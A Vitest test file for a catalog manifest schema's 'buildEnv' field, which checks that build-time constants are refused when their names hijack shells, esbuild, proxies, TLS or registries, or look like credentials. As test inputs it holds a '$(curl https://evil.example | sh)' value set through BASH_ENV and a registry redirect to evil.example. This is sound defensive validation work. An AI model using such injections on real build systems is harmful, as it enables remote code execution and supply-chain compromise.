import { describe, expect, it } from "vitest";
import { z } from "zod";
import { buildEnvNameProblem, buildEnvSchema, MAX_BUILD_ENV_ENTRIES } from "./build-env";
import { catalogManifestSchema } from "./catalog";

const manifest = {
  slug: "folia",
  name: "Folia",
  summary: "A music player.",
  tagline: "An app on Workers",
  homepage: "https://github.com/example/folia",
  repo: "example/folia",
  license: "MIT",
  categories: ["utilities"],
  maintainers: [],
  source: { ref: "main", sha: "0".repeat(40) },
  install: {
    tier: "artifact",
    packageManager: "pnpm",
    wranglerConfig: "wrangler.jsonc",
    workerName: "folia",
    buildCommand: "pnpm run build",
  },
  plan: "free",
  requires: [],
  secrets: [],
  vars: [],
  postInstall: [],
  tokenPermissions: [],
};

function withInstall(install: Record<string, unknown>) {
  return catalogManifestSchema.safeParse({
    ...manifest,
    install: { ...manifest.install, ...install },
  });
}

describe("install.buildEnv", () => {
  it("takes public constants by name and keeps them as written", () => {
    const parsed = withInstall({
      buildEnv: { VITE_SOURCES: "https://a.example,https://b.example", PUBLIC_ORIGINS: "" },
    });
    expect(parsed.success).toBe(true);
    expect(parsed.data?.install.buildEnv).toEqual({
      VITE_SOURCES: "https://a.example,https://b.example",
      PUBLIC_ORIGINS: "",
    });
    expect(withInstall({}).data?.install.buildEnv).toBeUndefined();
  });

  it("refuses names the build's tools read, credentials, and badly formed names", () => {
    expect(buildEnvNameProblem("VITE_API_ORIGIN")).toBeNull();
    expect(buildEnvNameProblem("NODE_OPTIONS")).toMatch(/starts with NODE_/);
    expect(buildEnvNameProblem("WRANGLER_LOG")).toMatch(/starts with WRANGLER_/);
    expect(buildEnvNameProblem("CLOUDFLARE_API_TOKEN")).toMatch(/starts with CLOUDFLARE_/);
    expect(buildEnvNameProblem("PATH")).toMatch(/processes, shells or network clients read/);
    expect(buildEnvNameProblem("CI")).toMatch(/processes, shells or network clients read/);
    expect(buildEnvNameProblem("ORIGINS")).toBeNull();
    expect(buildEnvNameProblem("SITE_TITLE")).toBeNull();
    expect(buildEnvNameProblem("VITE_CLIENT_SECRET")).toMatch(/looks like a credential \(SECRET\)/);
    expect(buildEnvNameProblem("API_TOKEN")).toMatch(/looks like a credential/);
    expect(buildEnvNameProblem("vite_api")).toMatch(/upper-case/);
    expect(buildEnvNameProblem("1ABC")).toMatch(/upper-case/);
    const refused = withInstall({ buildEnv: { NPM_CONFIG_REGISTRY: "https://evil.example" } });
    expect(refused.success).toBe(false);
    expect(refused.error?.issues[0]?.message).toMatch(
      /^name "NPM_CONFIG_REGISTRY" starts with NPM_/,
    );
  });

  it("refuses names that change how a shell, esbuild, TLS, a proxy or a config directory behaves", () => {
    // BASH_ENV runs a file whenever a build script starts bash.
    expect(buildEnvNameProblem("BASH_ENV")).toMatch(/starts with BASH/);
    // Read by esbuild inside wrangler's bundling, which gets the constants too.
    expect(buildEnvNameProblem("ESBUILD_BINARY_PATH")).toMatch(/starts with ESBUILD_/);
    expect(buildEnvNameProblem("HTTPS_PROXY")).toMatch(/network clients read/);
    expect(buildEnvNameProblem("SSL_CERT_FILE")).toMatch(/starts with SSL_/);
    expect(buildEnvNameProblem("XDG_CONFIG_HOME")).toMatch(/starts with XDG_/);
    expect(buildEnvNameProblem("ENV")).toMatch(/network clients read/);
    expect(buildEnvNameProblem("VITE_KEY_PASSPHRASE")).toMatch(/looks like a credential/);
    expect(buildEnvNameProblem("GOFLAGS")).toMatch(/network clients read/);
    expect(buildEnvNameProblem("GOOGLE_CLIENT_ID")).toBeNull();
    expect(buildEnvNameProblem("OAUTH_CLIENT_ID")).toBeNull();
    expect(withInstall({ buildEnv: { GOOGLE_CLIENT_ID: "a", OAUTH_CLIENT_ID: "b" } }).success).toBe(
      true,
    );
    expect(
      withInstall({ buildEnv: { BASH_ENV: "$(curl https://evil.example | sh)" } }).success,
    ).toBe(false);
  });

  it("refuses an empty map, too many constants, and a NUL in a value", () => {
    expect(withInstall({ buildEnv: {} }).success).toBe(false);
    const many = Object.fromEntries(
      Array.from({ length: MAX_BUILD_ENV_ENTRIES + 1 }, (_, i) => [`VITE_X${i}`, "1"]),
    );
    expect(buildEnvSchema.safeParse(many).success).toBe(false);
    expect(buildEnvSchema.safeParse({ VITE_X: "a\0b" }).success).toBe(false);
  });

  it("is refused on a self-deploying entry, whose installer runs without the packer", () => {
    const parsed = catalogManifestSchema.safeParse({
      ...manifest,
      plan: "paid",
      install: {
        ...manifest.install,
        tier: "self-deploying",
        buildCommand: undefined,
        buildEnv: { VITE_X: "1" },
        selfDeploying: {
          tool: "alchemy",
          deployCommand: ["pnpm", "alchemy", "deploy", "--yes"],
          destroyCommand: ["pnpm", "alchemy", "destroy", "--yes"],
          workerNames: ["app-{{stage}}"],
        },
      },
    });
    expect(parsed.success).toBe(false);
    expect(parsed.error?.issues.map((i) => i.message)).toContain(
      "install.buildEnv is not allowed for the self-deploying tier: its installer builds the app without the packer that sets these constants",
    );
  });

  it("states the name rule in the JSON Schema, so editors refuse the same names", () => {
    const install = z.toJSONSchema(catalogManifestSchema).properties?.install;
    const buildEnv =
      typeof install === "object" && typeof install.properties?.buildEnv === "object"
        ? install.properties.buildEnv
        : undefined;
    const names =
      buildEnv !== undefined && typeof buildEnv.propertyNames === "object"
        ? buildEnv.propertyNames
        : undefined;
    const pattern = new RegExp(String(names?.pattern));
    expect(pattern.test("VITE_API_ORIGIN")).toBe(true);
    expect(pattern.test("NODE_OPTIONS")).toBe(false);
    expect(pattern.test("PATH")).toBe(false);
    expect(pattern.test("PATHS")).toBe(true);
    expect(pattern.test("VITE_SECRET_KEY")).toBe(false);
    expect(pattern.test("BASH_ENV")).toBe(false);
    expect(pattern.test("HTTPS_PROXY")).toBe(false);
    expect(pattern.test("ORIGINS")).toBe(true);
    expect(pattern.test("lower")).toBe(false);
  });
});
